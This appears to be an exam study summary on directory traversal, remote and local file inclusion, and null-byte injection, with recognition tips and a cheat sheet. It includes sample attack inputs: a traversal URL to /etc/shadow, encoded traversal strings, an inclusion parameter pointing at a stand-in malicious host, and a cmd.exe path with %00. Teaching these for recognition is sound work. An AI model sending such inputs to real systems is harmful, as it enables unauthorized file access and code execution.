## Directory Traversal Attacks ‚Äì Exam Summary

---

## 1. What Is a Directory Traversal Attack?

A **directory traversal** is a **type of injection attack**.

* Injection attacks occur when an attacker inserts malicious input through an application interface.
* Directory traversal allows attackers to:

  * Access files
  * Access directories
  * Execute commands
    **outside the web document root**

### Key Idea

The attacker ‚Äútraverses‚Äù up the directory structure to reach sensitive files that should not be accessible from the web.

---

## 2. Web Document Root vs System Root

* **Web document root**:
  The directory that stores website files (e.g., `/www_root`)
* **System root**:
  The root of the operating system‚Äôs file system (e.g., `/` on Linux)

Directory traversal exploits the difference between these two.

---

## 3. How Directory Traversal Works

Attackers use special characters to move **up directories**.

### Common Traversal Syntax

* **Linux / macOS (Unix-based):**

  ```
  ../
  ```
* **Windows:**

  ```
  ..\
  ```

### Example

```
https://site.com/../../../../etc/shadow
```

What this does:

1. Starts in the web root
2. Uses `../` repeatedly to move up directories
3. Accesses sensitive system files (like `/etc/shadow`)

---

## 4. Encoded Directory Traversal

Attackers often **hide traversal attempts using encoding**.

Example:

```
%2e%2e%2f  =  ../
```

### Exam Tip

If you see **URL-encoded dots or slashes**, think **directory traversal**.

---

## 5. Why Directory Traversal Is Dangerous

If permissions are misconfigured, attackers may:

* Read sensitive files (passwords, configs)
* Execute system commands
* Gain deeper system access

This can all happen **remotely through a browser**.

---

## 6. File Inclusion Vulnerabilities

File inclusion is closely related to directory traversal.

### Definition

A **file inclusion vulnerability** allows attackers to:

* Load files from arbitrary locations
* Execute malicious scripts
* Create backdoors

---

## 7. Types of File Inclusion

### A. Remote File Inclusion (RFI)

* Attacker loads a **file hosted on another server**
* Example:

```
login.php?user=http://malware.site/malicious.php
```

What happens:

* The application loads and executes a **remote malicious script**

---

### B. Local File Inclusion (LFI)

* Attacker loads a **file already on the server**
* Often combined with directory traversal

Example:

```
login.php?user=../../Windows/System32/cmd.exe%00
```

What‚Äôs happening:

* Traverses directories
* Executes a local system file
* `%00` = null byte (used to bypass extension checks)

---

## 8. Null Byte Injection (%00)

* `%00` represents a **null character**
* Used to:

  * Bypass file extension validation
  * Prevent the app from appending `.php`
* Common in **local file inclusion attacks**

---

## 9. Exam Recognition Tips (VERY IMPORTANT)

### On the Exam:

* **Anytime you see:**

  * `../`
  * `..\`
  * URL-encoded equivalents (`%2e%2e`)

üëâ **Think: Directory Traversal**

### Also Remember:

* Local File Inclusion (LFI) is a **type of directory traversal**
* Exam questions will **not** list both as options at the same time
* Logs and proxy output often contain traversal attempts

---

## One-Line Memory Trick

> **‚ÄúDots that go up (../) = directory traversal.‚Äù**

---

## Quick Exam Cheat Sheet

| Indicator               | Meaning               |
| ----------------------- | --------------------- |
| `../` or `..\`          | Directory traversal   |
| `%2e%2e%2f`             | Encoded traversal     |
| Remote URL in parameter | Remote File Inclusion |
| Local system path       | Local File Inclusion  |
| `%00`                   | Null byte injection   |

